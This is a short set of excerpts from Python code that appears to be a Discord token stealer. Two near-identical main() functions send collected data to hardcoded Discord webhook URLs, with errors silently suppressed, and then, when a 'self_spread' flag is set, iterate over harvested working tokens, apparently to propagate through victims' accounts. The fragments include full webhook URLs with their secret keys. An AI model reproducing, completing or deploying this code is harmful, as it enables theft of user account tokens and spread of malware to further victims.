...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/826177950012932176/d1kKkOCbdOipOpN-hdfBQN6TIV492HAsCN793lmHZNiFHnyHGe-2UZwy-sx6PUdb5RjC", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/826178221972127745/PaCD2iREkmdDmJw5hYJAOJ5VOdKLjHs2TP088-xRH96n0dscYgrS2GFYk-d5IqroB7cm", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
